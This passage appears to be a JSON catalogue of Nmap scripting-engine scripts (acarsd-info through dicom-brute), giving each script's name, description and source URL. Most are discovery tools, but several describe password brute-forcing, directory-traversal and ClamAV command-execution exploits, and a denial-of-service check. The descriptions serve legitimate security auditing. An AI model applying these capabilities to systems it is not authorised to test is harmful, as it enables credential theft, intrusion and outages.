[
  {
    "name": "acarsd-info.nse",
    "description": "Retrieves information from a listening acarsd daemon. Acarsd decodes\nACARS (Aircraft Communication Addressing and Reporting System) data in\nreal time.  The information retrieved by this script includes the\ndaemon version, API version, administrator e-mail address and\nlistening frequency.\n\nFor more information about acarsd, see:\n* http://www.acarsd.org/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "address-info.nse",
    "description": "Shows extra information about IPv6 addresses, such as embedded MAC or IPv4 addresses when available.\n\nSome IP address formats encode extra information; for example some IPv6\naddresses encode an IPv4 address or MAC address. This script can decode\nthese address formats:\n* IPv4-compatible IPv6 addresses,\n* IPv4-mapped IPv6 addresses,\n* Teredo IPv6 addresses,\n* 6to4 IPv6 addresses,\n* IPv6 addresses using an EUI-64 interface ID,\n* IPv4-embedded IPv6 addresses,\n* IPv4-translated IPv6 addresses and\n* ISATAP Modified EUI-64 IPv6 addresses.\n\nSee RFC 4291 for general IPv6 addressing architecture and the\ndefinitions of some terms.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "afp-brute.nse",
    "description": "Performs password guessing against Apple Filing Protocol (AFP).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "afp-ls.nse",
    "description": "Attempts to get useful information about files from AFP volumes.\nThe output is intended to resemble the output of <code>ls</code>.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "afp-path-vuln.nse",
    "description": "Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.\n\nThis script attempts to iterate over all AFP shares on the remote\nhost. For each share it attempts to access the parent directory by\nexploiting the directory traversal vulnerability as described in\nCVE-2010-0533.\n\nThe script reports whether the system is vulnerable or not. In\naddition it lists the contents of the parent and child directories to\na max depth of 2.\nWhen running in verbose mode, all items in the listed directories are\nshown.  In non verbose mode, output is limited to the first 5 items.\nIf the server is not vulnerable, the script will not return any\ninformation.\n\nFor additional information:\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0533\n* http://www.cqure.net/wp/2010/03/detecting-apple-mac-os-x-afp-vulnerability-cve-2010-0533-with-nmap\n* http://support.apple.com/kb/HT1222",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "afp-serverinfo.nse",
    "description": "Shows AFP server information. This information includes the server's\nhostname, IPv4 and IPv6 addresses, and hardware type (for example\n<code>Macmini</code> or <code>MacBookPro</code>).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "afp-showmount.nse",
    "description": "Shows AFP shares and ACLs.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ajp-auth.nse",
    "description": "Retrieves the authentication scheme and realm of an AJP service (Apache JServ Protocol) that requires authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ajp-brute.nse",
    "description": "Performs brute force passwords auditing against the Apache JServ protocol.\nThe Apache JServ Protocol is commonly used by web servers to communicate with\nback-end Java application server containers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ajp-headers.nse",
    "description": "Performs a HEAD or GET request against either the root directory or any\noptional directory of an Apache JServ Protocol server and returns the server response headers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ajp-methods.nse",
    "description": "Discovers which options are supported by the AJP (Apache JServ\nProtocol) server by sending an OPTIONS request and lists potentially\nrisky methods.\n\nIn this script, \"potentially risky\" methods are anything except GET,\nHEAD, POST, and OPTIONS. If the script reports potentially risky\nmethods, they may not all be security risks, but you should check to\nmake sure. This page lists the dangers of some common methods:\n\nhttp://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ajp-request.nse",
    "description": "Requests a URI over the Apache JServ Protocol and displays the result\n(or stores it in a file). Different AJP methods such as; GET, HEAD,\nTRACE, PUT or DELETE may be used.\n\nThe Apache JServ Protocol is commonly used by web servers to communicate with\nback-end Java application server containers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "allseeingeye-info.nse",
    "description": "Detects the All-Seeing Eye service. Provided by some game servers for\nquerying the server's status.\n\nThe All-Seeing Eye service can listen on a UDP port separate from the\nmain game server port (usually game port + 123). On receiving a packet\nwith the payload \"s\", it replies with various game server status info.\n\nWhen run as a version detection script (<code>-sV</code>), the script\nwill report on the game name, version, actual port, and whether it has a\npassword. When run explicitly (<code>--script allseeingeye-info</code>), the\nscript will additionally report on the server name, game type, map name,\ncurrent number of players, maximum number of players, player\ninformation, and various other information.\n\nFor more info on the protocol see:\nhttp://int64.org/docs/gamestat-protocols/ase.html\nhttp://aluigi.altervista.org/papers.htm#ase\nhttp://sourceforge.net/projects/gameq/\n(relevant files: games.ini, packets.ini, ase.php)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "amqp-info.nse",
    "description": "Gathers information (a list of all server properties) from an AMQP (advanced message queuing protocol) server.\n\nSee http://www.rabbitmq.com/extensions.html for details on the\n<code>server-properties</code> field.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "asn-query.nse",
    "description": "Maps IP addresses to autonomous system (AS) numbers.\n\nThe script works by sending DNS TXT queries to a DNS server which in\nturn queries a third-party service provided by Team Cymru\n(https://www.team-cymru.org/Services/ip-to-asn.html) using an in-addr.arpa\nstyle zone set up especially for\nuse by Nmap. The responses to these queries contain both Origin and Peer\nASNs and their descriptions, displayed along with the BGP Prefix and\nCountry Code. The script caches results to reduce the number of queries\nand should perform a single query for all scanned targets in a BGP\nPrefix present in Team Cymru's database.\n\nBe aware that any targets against which this script is run will be sent\nto and potentially recorded by one or more DNS servers and Team Cymru.\nIn addition your IP address will be sent along with the ASN to a DNS\nserver (your default DNS server, or whichever one you specified with the\n<code>dns</code> script argument).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "auth-owners.nse",
    "description": "Attempts to find the owner of an open TCP port by querying an auth\ndaemon which must also be open on the target system. The auth service,\nalso known as identd, normally runs on port 113.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "auth-spoof.nse",
    "description": "Checks for an identd (auth) server which is spoofing its replies.\n\nTests whether an identd (auth) server responds with an answer before\nwe even send the query.  This sort of identd spoofing can be a sign of\nmalware infection, though it can also be used for legitimate privacy\nreasons.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "backorifice-brute.nse",
    "description": "Performs brute force password auditing against the BackOrifice service. The\n<code>backorifice-brute.ports</code> script argument is mandatory (it specifies ports to run\nthe script against).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "backorifice-info.nse",
    "description": "Connects to a BackOrifice service and gathers information about\nthe host and the BackOrifice service itself.\n\nThe extracted host information includes basic system setup, list\nof running processes, network resources and shares.\n\nInformation about the service includes enabled port redirections,\nlistening console applications and a list of BackOrifice plugins\ninstalled with the service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bacnet-info.nse",
    "description": "Discovers and enumerates BACNet Devices collects device information based off\nstandard requests. In some cases, devices may not strictly follow the\nspecifications, or may comply with older versions of the specifications, and\nwill result in a BACNET error response. Presence of this error positively\nidentifies the device as a BACNet device, but no enumeration is possible.\n\nNote: Requests and responses are via UDP 47808, ensure scanner will receive UDP\n47808 source and destination responses.\n\nhttp://digitalbond.com",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "banner.nse",
    "description": "A simple banner grabber which connects to an open TCP port and prints out anything sent by the listening service within five seconds.\n\nThe banner will be truncated to fit into a single line, but an extra line may be printed for every\nincrease in the level of verbosity requested on the command line.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bitcoin-getaddr.nse",
    "description": "Queries a Bitcoin server for a list of known Bitcoin nodes",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bitcoin-info.nse",
    "description": "Extracts version and node information from a Bitcoin server",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bitcoinrpc-info.nse",
    "description": "Obtains information from a Bitcoin server by calling <code>getinfo</code> on its JSON-RPC interface.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bittorrent-discovery.nse",
    "description": "Discovers bittorrent peers sharing a file based on a user-supplied\ntorrent file or magnet link.  Peers implement the Bittorrent protocol\nand share the torrent, whereas the nodes (only shown if the\ninclude-nodes NSE argument is given) implement the DHT protocol and\nare used to track the peers. The sets of peers and nodes are not the\nsame, but they usually intersect.\n\nIf the <code>newtargets</code> script-arg is supplied it adds the discovered\npeers as targets.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "bjnp-discover.nse",
    "description": "Retrieves printer or scanner information from a remote device supporting the\nBJNP protocol. The protocol is known to be supported by network based Canon\ndevices.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-ataoe-discover.nse",
    "description": "Discovers servers supporting the ATA over Ethernet protocol. ATA over Ethernet\nis an ethernet protocol developed by the Brantley Coile Company and allows for\nsimple, high-performance access to SATA drives over Ethernet.\n\nDiscovery is performed by sending a Query Config Request to the Ethernet\nbroadcast address with all bits set in the major and minor fields of the\nheader.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-avahi-dos.nse",
    "description": "Attempts to discover hosts in the local network using the DNS Service\nDiscovery protocol and sends a NULL UDP packet to each host to test\nif it is vulnerable to the Avahi NULL UDP packet denial of service\n(CVE-2011-1002).\n\nThe <code>broadcast-avahi-dos.wait</code> script argument specifies how\nmany number of seconds to wait before a new attempt of host discovery.\nEach host who does not respond to this second attempt will be considered\nvulnerable.\n\nReference:\n* http://avahi.org/ticket/325\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-bjnp-discover.nse",
    "description": "Attempts to discover Canon devices (Printers/Scanners) supporting the\nBJNP protocol by sending BJNP Discover requests to the network\nbroadcast address for both ports associated with the protocol.\n\nThe script then attempts to retrieve the model, version and some additional\ninformation for all discovered devices.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-db2-discover.nse",
    "description": "Attempts to discover DB2 servers on the network by sending a broadcast request to port 523/udp.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-dhcp-discover.nse",
    "description": "Sends a DHCP request to the broadcast address (255.255.255.255) and reports\nthe results. By default, the script uses a static MAC address\n(DE:AD:CO:DE:CA:FE) in order to prevent IP pool exhaustion.\n\nThe script reads the response using pcap by opening a listening pcap socket\non all available ethernet interfaces that are reported up. If no response\nhas been received before the timeout has been reached (default 10 seconds)\nthe script will abort execution.\n\nThe script needs to be run as a privileged user, typically root.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-dhcp6-discover.nse",
    "description": "Sends a DHCPv6 request (Solicit) to the DHCPv6 multicast address,\nparses the response, then extracts and prints the address along with\nany options returned by the server.\n\nThe script requires Nmap to be run in privileged mode as it binds the socket\nto a privileged port (udp/546).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-dns-service-discovery.nse",
    "description": "Attempts to discover hosts' services using the DNS Service Discovery protocol.  It sends a multicast DNS-SD query and collects all the responses.\n\nThe script first sends a query for _services._dns-sd._udp.local to get a\nlist of services. It then sends a followup query for each one to try to\nget more information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-dropbox-listener.nse",
    "description": "Listens for the LAN sync information broadcasts that the Dropbox.com client\nbroadcasts every 20 seconds, then prints all the discovered client IP\naddresses, port numbers, version numbers, display names, and more.\n\nIf the <code>newtargets</code> script argument is given, all discovered Dropbox\nclients will be added to the Nmap target list rather than just listed in the\noutput.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-eigrp-discovery.nse",
    "description": "Performs network discovery and routing information gathering through\nCisco's Enhanced Interior Gateway Routing Protocol (EIGRP).\n\nThe script works by sending an EIGRP Hello packet with the specified Autonomous\nSystem value to the 224.0.0.10 multicast address and listening for EIGRP Update\npackets. The script then parses the update responses for routing information.\n\nIf no A.S value was provided by the user, the script will listen for multicast\nHello packets to grab an A.S value. If no interface was provided as a script\nargument or through the -e option, the script will send packets and listen\nthrough all valid ethernet interfaces simultaneously.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-hid-discoveryd.nse",
    "description": "Discovers HID devices on a LAN by sending a discoveryd network broadcast probe.\n\nFor more information about HID discoveryd, see:\n* http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html\n* https://github.com/coldfusion39/VertXploit",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-igmp-discovery.nse",
    "description": "Discovers targets that have IGMP Multicast memberships and grabs interesting information.\n\nThe scripts works by sending IGMP Membership Query message to the 224.0.0.1 All\nHosts multicast address and listening for IGMP Membership Report messages. The\nscript then extracts all the interesting information from the report messages\nsuch as the version, group, mode, source addresses (depending on the version).\n\nThe script defaults to sending an IGMPv2 Query but this could be changed to\nanother version (version 1 or 3) or to sending queries of all three version. If\nno interface was specified as a script argument or with the -e option, the\nscript will proceed to sending queries through all the valid ethernet\ninterfaces.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-jenkins-discover.nse",
    "description": "Discovers Jenkins servers on a LAN by sending a discovery broadcast probe.\n\nFor more information about Jenkins auto discovery, see:\n* https://wiki.jenkins.io/display/JENKINS/Auto-discovering+Jenkins+on+the+network",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-listener.nse",
    "description": "Sniffs the network for incoming broadcast communication and\nattempts to decode the received packets. It supports protocols like CDP, HSRP,\nSpotify, DropBox, DHCP, ARP and a few more. See packetdecoders.lua for more\ninformation.\n\nThe script attempts to sniff all ethernet based interfaces with an IPv4 address\nunless a specific interface was given using the -e argument to Nmap.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-ms-sql-discover.nse",
    "description": "Discovers Microsoft SQL servers in the same broadcast domain.\n\nSQL Server credentials required: No (will not benefit from\n<code>mssql.username</code> & <code>mssql.password</code>).\n\nThe script attempts to discover SQL Server instances in the same broadcast\ndomain. Any instances found are stored in the Nmap registry for use by any\nother ms-sql-* scripts that are run in the same scan.\n\nIn contrast to the <code>ms-sql-discover</code> script, the broadcast version\nwill use a broadcast method rather than targeting individual hosts. However, the\nbroadcast version will only use the SQL Server Browser service discovery method.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-netbios-master-browser.nse",
    "description": "Attempts to discover master browsers and the domains they manage.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-networker-discover.nse",
    "description": "Discovers EMC Networker backup software servers on a LAN by sending a network broadcast query.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-novell-locate.nse",
    "description": "Attempts to use the Service Location Protocol to discover Novell NetWare Core Protocol (NCP) servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-ospf2-discover.nse",
    "description": "Discover IPv4 networks using Open Shortest Path First version 2(OSPFv2) protocol.\n\nThe script works by listening for OSPF Hello packets from the 224.0.0.5\nmulticast address. The script then replies and attempts to create a neighbor\nrelationship, in order to discover network database.\n\nIf no interface was provided as a script argument or through the -e option,\nthe script will fail unless a single interface is present on the system.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-pc-anywhere.nse",
    "description": "Sends a special broadcast probe to discover PC-Anywhere hosts running on a LAN.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-pc-duo.nse",
    "description": "Discovers PC-DUO remote control hosts and gateways running on a LAN by sending a special broadcast UDP probe.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-pim-discovery.nse",
    "description": "Discovers routers that are running PIM (Protocol Independent Multicast).\n\nThis works by sending a PIM Hello message to the PIM multicast address\n224.0.0.13 and listening for Hello messages from other routers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-ping.nse",
    "description": "Sends broadcast pings on a selected interface using raw ethernet packets and\noutputs the responding hosts' IP and MAC addresses or (if requested) adds them\nas targets.  Root privileges on UNIX are required to run this script since it\nuses raw sockets.  Most operating systems don't respond to broadcast-ping\nprobes, but they can be configured to do so.\n\nThe interface on which is broadcasted can be specified using the -e Nmap option\nor the <code>broadcast-ping.interface</code> script-arg. If no interface is\nspecified this script broadcasts on all ethernet interfaces which have an IPv4\naddress defined.\n\nThe <code>newtarget</code> script-arg can be used so the script adds the\ndiscovered IPs as targets.\n\nThe timeout of the ICMP probes can be specified using the <code>timeout</code>\nscript-arg. The default timeout is 3000 ms. A higher number might be necessary\nwhen scanning across larger networks.\n\nThe number of sent probes can be specified using the <code>num-probes</code>\nscript-arg. The default number is 1. A higher value might get more results on\nlarger networks.\n\nThe ICMP probes sent comply with the --ttl and --data-length Nmap options, so\nyou can use those to control the TTL(time to live) and ICMP payload length\nrespectively. The default value for TTL is 64, and the length of the payload\nis 0. The payload is consisted of random bytes.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-pppoe-discover.nse",
    "description": "Discovers PPPoE (Point-to-Point Protocol over Ethernet) servers using\nthe PPPoE Discovery protocol (PPPoED).  PPPoE is an ethernet based\nprotocol so the script has to know what ethernet interface to use for\ndiscovery. If no interface is specified, requests are sent out on all\navailable interfaces.\n\nAs the script send raw ethernet frames it requires Nmap to be run in privileged\nmode to operate.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-rip-discover.nse",
    "description": "Discovers hosts and routing information from devices running RIPv2 on the\nLAN. It does so by sending a RIPv2 Request command and collects the responses\nfrom all devices responding to the request.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-ripng-discover.nse",
    "description": "Discovers hosts and routing information from devices running RIPng on the\nLAN by sending a broadcast RIPng Request command and collecting any responses.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-sonicwall-discover.nse",
    "description": "Discovers Sonicwall firewalls which are directly attached (not routed) using\nthe same method as the manufacturers own 'SetupTool'. An interface needs to be\nconfigured, as the script broadcasts a UDP packet.\n\nThe script needs to be run as a privileged user, typically root.\n\nReferences:\n* https://support.software.dell.com/kb/sw3677)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-sybase-asa-discover.nse",
    "description": "Discovers Sybase Anywhere servers on the LAN by sending broadcast discovery messages.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-tellstick-discover.nse",
    "description": "Discovers Telldus Technologies TellStickNet devices on the LAN. The Telldus\nTellStick is used to wirelessly control electric devices such as lights,\ndimmers and electric outlets. For more information: http://www.telldus.com/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-upnp-info.nse",
    "description": "Attempts to extract system information from the UPnP service by sending a multicast query, then collecting, parsing, and displaying all responses.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-versant-locate.nse",
    "description": "Discovers Versant object databases using the broadcast srvloc protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-wake-on-lan.nse",
    "description": "Wakes a remote system up from sleep by sending a Wake-On-Lan packet.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-wpad-discover.nse",
    "description": "Retrieves a list of proxy servers on a LAN using the Web Proxy\nAutodiscovery Protocol (WPAD).  It implements both the DHCP and DNS\nmethods of doing so and starts by querying DHCP to get the address.\nDHCP discovery requires nmap to be running in privileged mode and will\nbe skipped when this is not the case.  DNS discovery relies on the\nscript being able to resolve the local domain either through a script\nargument or by attempting to reverse resolve the local IP.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-wsdd-discover.nse",
    "description": "Uses a multicast query to discover devices supporting the Web Services\nDynamic Discovery (WS-Discovery) protocol. It also attempts to locate\nany published Windows Communication Framework (WCF) web services (.NET\n4.0 or later).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "broadcast-xdmcp-discover.nse",
    "description": "Discovers servers running the X Display Manager Control Protocol (XDMCP) by\nsending a XDMCP broadcast request to the LAN. Display managers allowing access\nare marked using the keyword Willing in the result.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cassandra-brute.nse",
    "description": "Performs brute force password auditing against the Cassandra database.\n\nFor more information about Cassandra, see:\nhttp://cassandra.apache.org/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cassandra-info.nse",
    "description": "Attempts to get basic info and server status from a Cassandra database.\n\nFor more information about Cassandra, see:\nhttp://cassandra.apache.org/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cccam-version.nse",
    "description": "Detects the CCcam service (software for sharing subscription TV among\nmultiple receivers).\n\nThe service normally runs on port 12000. It distinguishes\nitself by printing 16 random-looking bytes upon receiving a\nconnection.\n\nBecause the script attempts to detect \"random-looking\" bytes, it has a small\nchance of failing to detect the service when the data do not seem random\nenough.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cics-enum.nse",
    "description": "CICS transaction ID enumerator for IBM mainframes.\nThis script is based on mainframe_brute by Dominic White\n(https://github.com/sensepost/mainframe_brute). However, this script\ndoesn't rely on any third party libraries or tools and instead uses\nthe NSE TN3270 library which emulates a TN3270 screen in lua.\n\nCICS only allows for 4 byte transaction IDs, that is the only specific rule\nfound for CICS transaction IDs.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cics-info.nse",
    "description": "Using the CICS transaction CEMT, this script attempts to gather information\nabout the current CICS transaction server region. It gathers OS information,\nDatasets (files), transactions and user ids. Based on CICSpwn script by\nAyoub ELAASSAL.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cics-user-brute.nse",
    "description": "CICS User ID brute forcing script for the CESL login screen.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cics-user-enum.nse",
    "description": "CICS User ID enumeration script for the CESL/CESN Login screen.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "citrix-brute-xml.nse",
    "description": "Attempts to guess valid credentials for the Citrix PN Web Agent XML\nService. The XML service authenticates against the local Windows server\nor the Active Directory.\n\nThis script makes no attempt of preventing account lockout. If the\npassword list contains more passwords than the lockout-threshold\naccounts will be locked.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "citrix-enum-apps-xml.nse",
    "description": "Extracts a list of applications, ACLs, and settings from the Citrix XML\nservice.\n\nThe script returns more output with higher verbosity.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "citrix-enum-apps.nse",
    "description": "Extracts a list of published applications from the ICA Browser service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "citrix-enum-servers-xml.nse",
    "description": "Extracts the name of the server farm and member servers from Citrix XML\nservice.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "citrix-enum-servers.nse",
    "description": "Extracts a list of Citrix servers from the ICA Browser service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "clamav-exec.nse",
    "description": "Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.\n\nClamAV server 0.99.2, and possibly other previous versions, allow the execution\nof dangerous service commands without authentication. Specifically, the command 'SCAN'\nmay be used to list system files and the command 'SHUTDOWN' shut downs the\nservice. This vulnerability was discovered by Alejandro Hernandez (nitr0us).\n\nThis script without arguments test the availability of the command 'SCAN'.\n\nReference:\n* https://twitter.com/nitr0usmx/status/740673507684679680\n* https://bugzilla.clamav.net/show_bug.cgi?id=11585",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "clock-skew.nse",
    "description": "Analyzes the clock skew between the scanner and various services that report timestamps.\n\nAt the end of the scan, it will show groups of systems that have similar median\nclock skew among their services. This can be used to identify targets with\nsimilar configurations, such as those that share a common time server.\n\nYou must run at least 1 of the following scripts to collect clock data:\n*",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "coap-resources.nse",
    "description": "Dumps list of available resources from CoAP endpoints.\n\nThis script establishes a connection to a CoAP endpoint and performs a\nGET request on a resource. The default resource for our request is\n<code>/.well-known/core</core>, which should contain a list of\nresources provided by the endpoint.\n\nFor additional information:\n* https://en.wikipedia.org/wiki/Constrained_Application_Protocol\n* https://tools.ietf.org/html/rfc7252\n* https://tools.ietf.org/html/rfc6690",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "couchdb-databases.nse",
    "description": "Gets database tables from a CouchDB database.\n\nFor more info about the CouchDB HTTP API, see\nhttp://wiki.apache.org/couchdb/HTTP_database_API.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "couchdb-stats.nse",
    "description": "Gets database statistics from a CouchDB database.\n\nFor more info about the CouchDB HTTP API and the statistics, see\nhttp://wiki.apache.org/couchdb/Runtime_Statistics\nand\nhttp://wiki.apache.org/couchdb/HTTP_database_API.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "creds-summary.nse",
    "description": "Lists all discovered credentials (e.g. from brute force and default password checking scripts) at end of scan.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cups-info.nse",
    "description": "Lists printers managed by the CUPS printing service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cups-queue-info.nse",
    "description": "Lists currently queued print jobs of the remote CUPS service grouped by\nprinter.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cvs-brute-repository.nse",
    "description": "Attempts to guess the name of the CVS repositories hosted on the remote server.\nWith knowledge of the correct repository name, usernames and passwords can be guessed.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "cvs-brute.nse",
    "description": "Performs brute force password auditing against CVS pserver authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "daap-get-library.nse",
    "description": "Retrieves a list of music from a DAAP server. The list includes artist\nnames and album and song titles.\n\nOutput will be capped to 100 items if not otherwise specified in the\n<code>daap_item_limit</code> script argument. A\n<code>daap_item_limit</code> below zero outputs the complete contents of\nthe DAAP library.\n\nBased on documentation found here:\nhttp://www.tapjam.net/daap/.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "daytime.nse",
    "description": "Retrieves the day and time from the Daytime service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "db2-das-info.nse",
    "description": "Connects to the IBM DB2 Administration Server (DAS) on TCP or UDP port 523 and\nexports the server profile.  No authentication is required for this request.\n\nThe script will also set the port product and version if a version scan is\nrequested.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "deluge-rpc-brute.nse",
    "description": "Performs brute force password auditing against the DelugeRPC daemon.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dhcp-discover.nse",
    "description": "Sends a DHCPINFORM request to a host on UDP port 67 to obtain all the local configuration parameters\nwithout allocating a new address.\n\nDHCPINFORM is a DHCP request that returns useful information from a DHCP server, without allocating an IP\naddress. The request sends a list of which fields it wants to know (a handful by default, every field if\nverbosity is turned on), and the server responds with the fields that were requested. It should be noted\nthat the server doesn't have to return every field, nor does it have to return them in the same order,\nor honour the request at all. A Linksys WRT54g, for example, completely ignores the list of requested\nfields and returns a few standard ones. This script displays every field it receives.\n\nWith script arguments, the type of DHCP request can be changed, which can lead to interesting results.\nAdditionally, the MAC address can be randomized, which in should override the cache on the DHCP server and\nassign a new IP address. Extra requests can also be sent to exhaust the IP address range more quickly.\n\nSome of the more useful fields:\n* DHCP Server (the address of the server that responded)\n* Subnet Mask\n* Router\n* DNS Servers\n* Hostname",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dicom-brute.nse",
    "description": "Attempts to brute force the Application Entity Title of a DICOM server (DICOM Service Provider).\n\nApplication Entity Titles (AET) are used to restrict responses only to clients knowing the title. Hence,\n the called AET is used as a form of password.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dicom-ping.nse",
